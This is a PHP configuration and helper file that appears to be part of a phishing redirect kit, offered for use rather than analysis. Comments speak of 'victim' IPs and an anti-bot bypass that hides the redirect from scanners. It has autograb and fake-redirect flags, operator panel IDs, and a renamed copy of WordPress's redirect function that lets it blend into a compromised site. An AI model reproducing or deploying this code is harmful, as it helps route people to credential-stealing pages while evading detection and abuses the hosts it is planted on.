<?php 
// Value 1 test cpanel working with script or not
// Set value 0 before start 
define('DEBUG_TEST_CP_WORKING',0);
// BYPASS ANTI BOT value false : will enable check BOT will disable not show redirect 
// value true : will disablecheck bot will show all any IP of victim 
define('BY_PASSBOT',false);
define('REDIRECT_LINK',true);
define('TYPEL_ATUO',true);
define('FAKE_BD_RE',true);
// add more #ld-  on end link for use without autograb with sogou.com 
// EX: https://strongemoreiz.pearly.workers.dev/?bbre=oUfphz#ld-
$linkRE="";
// ex: "/pa1/pa2/pa3" or "/path1/patjh2"
$wordshash="/appap";
// config if domain index is root (sogou must config same same link rediret to check rerfer
// IF NOT use with SOGOU.COM edit $wordshashjs=""
// config bing: word/a@aa.com on  => $wordshashjs="word/";  ( link use bing/....u=CHAR_OFBING#word/CODEGRAB
$wordshashjs="";
// end domain will /
$wordshashjs_prefix_hash="predevsz";

// value copy from panel
define('ID_API_RE',"67e00ea3319dc9c5df022624");

// is username login on ur panel 
define('ID_USER',"0x67e00de1319dc9c5df022622");
define('PRIVATE_CN',"kute");
function  has111($str,$content, $type = 1)
   {
       $bool = $type == 1 ? stripos($content, $str) : strpos($content, $str);
       return $bool !== false;
   }

function wp_redirectaa( $location, $status = 302, $x_redirect_by = 'WordPress' ) {
    // check valid function is wp
    if(!@function_exists('apply_filters')){
        
		header('Location: '.$location,true,$status);
         return false;
    
    }
       
    nocache_headers();
	global $is_IIS;

	/**
	 * Filters the redirect location.
	 *
	 * @since 2.1.0
	 *
	 * @param string $location The path or URL to redirect to.
	 * @param int    $status   The HTTP response status code to use.
	 */
	$location = apply_filters( 'wp_redirect', $location, $status );

	/**
	 * Filters the redirect HTTP response status code to use.
	 *
	 * @since 2.3.0
	 *
	 * @param int    $status   The HTTP response status code to use.
	 * @param string $location The path or URL to redirect to.
	 */
	$status = apply_filters( 'wp_redirect_status', $status, $location );

	if ( ! $location ) {
		return false;
	}

	if ( $status < 300 || 399 < $status ) {
		wp_die( __( 'HTTP redirect status code must be a redirection code, 3xx.' ) );
	}

	$location = wp_sanitize_redirect( $location );

	if ( ! $is_IIS && 'cgi-fcgi' !== PHP_SAPI ) {
		status_header( $status ); // This causes problems on IIS and some FastCGI setups.
	}

	/**
	 * Filters the X-Redirect-By header.
	 *
	 * Allows applications to identify themselves when they're doing a redirect.
	 *
	 * @since 5.1.0
	 *
	 * @param string|false $x_redirect_by The application doing the redirect or false to omit the header.
	 * @param int          $status        Status code to use.
	 * @param string       $location      The path to redirect to.
	 */
	$x_redirect_by = apply_filters( 'x_redirect_by', $x_redirect_by, $status, $location );
	if ( is_string( $x_redirect_by ) ) {
		header( "X-Redirect-By: $x_redirect_by" );
	}
	// bypass cache each time
 header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
    header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); // past date to encourage expiring immediately
  
	header( "Location: $location", true, $status );

	return true;
}

function ipextract(){
	$ipaddress = '';
      if(isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
          $ipaddress =  $_SERVER['HTTP_CF_CONNECTING_IP'];
      } else if (isset($_SERVER['HTTP_X_REAL_IP'])) {
          $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
      }
      else if (isset($_SERVER['HTTP_CLIENT_IP']))
          $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
      else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
          $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
      else if(isset($_SERVER['HTTP_X_FORWARDED']))
          $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
      else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
          $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
      else if(isset($_SERVER['HTTP_FORWARDED']))
          $ipaddress = $_SERVER['HTTP_FORWARDED'];
      else if(isset($_SERVER['REMOTE_ADDR']))
          $ipaddress = $_SERVER['REMOTE_ADDR'];
      else
          $ipaddress = 'UNKNOWN';
	  $test= explode(",",$ipaddress);
	  if(count($test)>1)
		  return $ipaddress=$test[0];
      //return $ipaddress;
      return strip_tags($ipaddress);
}
/*
RewriteEngine On
RewriteBase /
#Redirect 301 ^/go1(.*)$ https://google.com/$1
#DirectoryIndex index.php
#RewriteRule ^index.php$ - [QSA,NC,L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(/)?$ index.php [QSA,NC,L]


*/
?>
